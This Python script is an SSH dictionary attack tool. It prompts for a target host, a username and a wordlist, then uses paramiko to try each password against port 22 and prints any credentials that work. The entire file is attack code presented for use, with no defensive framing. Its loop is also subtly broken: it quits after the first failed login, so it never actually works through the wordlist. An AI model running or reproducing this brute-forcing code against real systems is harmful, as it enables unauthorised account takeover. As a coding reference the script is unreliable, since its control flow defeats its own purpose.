import paramiko
import Crypto.PublicKey
import sys
import os
import socket

global host, username, line, input_file

line = "\n--------------------------------------------------------------\n"

try:
    host = input("Enter target host: ")
    username = input("Enter SSH username: ")
    input_file = input("Enter dictionary file: ")
    if os.path.exists(input_file) == False:
        print("[!][Error]: File doesn't exist!")
        quit()
except KeyboardInterrupt:
    print("[*] User requested an interrupt!")
    quit()

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port = 22, username = username, password = password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

input_file = open(input_file)

print("")

for i in input_file.readlines():
    password = i.strip("\n")
    try:
        response = ssh_connect(password)
        if response == 0:
            print("[*] User: " + username + "    [*] Password: " + password)
            quit()
        elif response == 1:
            print("[*][Testing]: User: " + username + "    [*] Password: " + password)
            quit()
        elif response == 2:
            print("[!][Error]: Couldn't connect to host (" + host + ")!")
            quit()
    except Exception:
        print("[!][Error]: Couldn't load dictionary!")
        quit()

input_file.close()